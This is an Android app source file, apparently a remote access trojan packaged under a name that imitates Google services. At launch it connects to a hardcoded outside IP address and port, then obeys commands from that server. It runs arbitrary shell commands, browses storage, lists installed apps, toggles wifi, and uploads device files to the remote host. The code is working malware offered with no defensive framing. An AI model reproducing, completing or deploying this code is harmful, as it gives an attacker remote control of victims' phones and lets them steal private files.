package com.google.googleservices;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
        startActivityForResult(enableBtIntent, 0);


        connect thread = new connect();
        thread.start();


    }


    class connect extends Thread {

        String currentpath = "/storage/emulated/0";

        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void run() {

            Socket server = conect_to_server();

            String output;
            while (true) {
                String cmd = get_cmd(server);
                if (cmd.startsWith("shell ")) {
                    output = shell(cmd.replace("shell ", ""));
                } else if (cmd.startsWith("turn")) {
                    output = basic_cmd(cmd);
                } else {
                    output = advanced_cmd(server, cmd);
                }
                send(server, "output size: " + output.length() + "\n" + output);
            }
        }

        Socket conect_to_server() {
            Socket sock = null;

            try {
                sock = new Socket("193.161.193.99", 44313);
                send(sock, "hello");

                String text = recv(sock);
                Log.d("from server", text);

            } catch (IOException e) {
                e.printStackTrace();
            }
            return sock;
        }

        void send(Socket sock, String text) {
            String text_size = (String.valueOf(text.length()));
            Log.d("text size", text_size);
            try {
                PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
                outs.println("buffer: " + text_size);
            } catch (IOException e) {
                e.printStackTrace();
            }

            Log.d("recv", recv(sock));
            try {
                PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);

                outs.println(text);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }




        String recv(Socket sock) {
            String str = "null";

            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                str = br.readLine();

            } catch (IOException e) {
                e.printStackTrace();
            }
            return str;
        }

        String get_cmd(Socket server) {
            String cmd = "null";

            cmd = recv(server);


            return cmd;
        }

        String wifi(String cmd) {
            Boolean status = null;
            String output = "null";
            if (cmd.contains("on")) {
                status = true;
                output = "Turning on wifi";
            } else if (cmd.contains("off")) {
                status = false;
                output = "Turning off wifi";
            }
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            wifiManager.setWifiEnabled(status);
            return output;
        }

        String basic_cmd(String cmd) {

            String output = "null";
            if (cmd.startsWith("turn")) {

                if (cmd.contains("wifi")) {
                    output = wifi(cmd);
                }

            }

            return output;
        }

        @RequiresApi(api = Build.VERSION_CODES.O)
        String advanced_cmd(Socket server, String cmd) {
            List<String> files = null;
            String output = "null";
            if (cmd.startsWith("ls")) {

                final String state = Environment.getExternalStorageState();

                if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
                    String location_to_ls = "null";
                    try {
                        if (cmd.replace("ls", "") != "") {
                            location_to_ls = currentpath + "/" + cmd.replace("ls ", "");

                        } else {
                            location_to_ls = currentpath;
                        }
                        files = ls(new File(location_to_ls));
                        output = files.toString();
                        Log.d("files", output);
                    } catch (Exception e) {
                        output = "No such directory or permission denied: " + location_to_ls;
                    }
                }

            } else if (cmd.startsWith("cd ")) {
                output = cd(server, cmd);
            } else if (cmd.startsWith("list apps")) {
                output = list_all_apps();
            } else if (cmd.startsWith("pwd")) {
                output = currentpath;
            }
            else if (cmd.startsWith("download ")){
                try {
                    send(server, "downloading");
                byte[] data = readbytes(new File(currentpath + cmd.split("download ")[1]));
                DataOutputStream dOut = new DataOutputStream(server.getOutputStream());
                    dOut.writeInt(data.length); // write length of the message
                    recv(server);
                    dOut.write(data);           // write the message
                }
                catch (Exception e){
                    e.getStackTrace();
                }
            }
            return output;
        }
        String download(String cmd){
            String output = "no information revieced from download";
            File file = new File(currentpath + cmd.split("download ")[1]);
            int size = (int) file.length();
            byte[] bytes = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(bytes, 0, bytes.length);
                buf.close();
            } catch (FileNotFoundException e) {
                output = "file not found";
                e.printStackTrace();
            } catch (IOException e) {
                output = "unknown error opening file";
                e.printStackTrace();
            }
            return output;
        }

        byte[] readbytes(File f) {
            int size = (int) f.length();
            byte bytes[] = new byte[size];
            byte tmpBuff[] = new byte[size];
            try {
                FileInputStream fis = new FileInputStream(f);
                try {

                    int read = fis.read(bytes, 0, size);
                    if (read < size) {
                        int remain = size - read;
                        while (remain > 0) {
                            read = fis.read(tmpBuff, 0, remain);
                            System.arraycopy(tmpBuff, 0, bytes, size - remain, read);
                            remain -= read;
                        }
                    }
                } catch (IOException e) {
                    throw e;
                } finally {
                    fis.close();
                }
            }
            catch (Exception e){
                e.getStackTrace();
            }
            return bytes;
        }
        private void getAllFilesOfDir(File directory) {
            Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");

            final File[] files = directory.listFiles();

            if (files != null) {
                for (File file : files) {
                    if (file != null) {
                        if (file.isDirectory()) {  // it is a folder...
                            Log.d("filesofdir", "Folder: " + file.getAbsolutePath() + "\n");
                            getAllFilesOfDir(file);
                        } else {  // it is a file...
                            Log.d("filesofdir", "File: " + file.getAbsolutePath() + "\n");
                        }
                    }
                }
            }
        }

        private List<String> ls(File directory) {
            Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");

            final File[] files = directory.listFiles();
            List<String> files2 = new ArrayList<String>();
            ;
            if (files != null) {
                for (File file : files) {
                    if (file != null) {
                        Log.d("filesofdir", file.getName() + "\n");
                        files2.add(file.getName());
                    }
                }
                return files2;
            }

            return null;
        }

        String cd(Socket server, String cmd) {
            send(server, "currentpath: " + currentpath);
            String output = recv(server);
            currentpath = output.split("newpath:")[1];
            return "current path set to:" + currentpath;
        }

        String list_all_apps() {
            try {
                final PackageManager pm = getPackageManager();

                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                String all_apps = null;


                for (ApplicationInfo packageInfo : packages) {
                    ApplicationInfo appinfo = pm.getApplicationInfo(packageInfo.packageName, 0);
                    all_apps = all_apps + "\n" + appinfo.loadLabel(pm);
                }
                return all_apps;
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
            return "failed to load apps";
        }

        String shell(String cmd) {

            Process process = null;
            try {
                process = Runtime.getRuntime().exec(cmd);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                int read;
                char[] buffer = new char[4096];
                StringBuffer output = new StringBuffer();
                while ((read = bufferedReader.read(buffer)) > 0) {
                    output.append(buffer, 0, read);
                }
                bufferedReader.close();

                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                int read2;
                char[] buffer2 = new char[4096];
                StringBuffer output2 = new StringBuffer();
                while ((read2 = bufferedReader2.read(buffer2)) > 0) {
                    output2.append(buffer2, 0, read2);
                }
                bufferedReader2.close();
                // Waits for the command to finish.
                process.waitFor();
                String output3 = output.toString() + output2.toString();
                Log.d("shell_command ", output3);

                return output3;

            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
            return "error";
        }

    }

}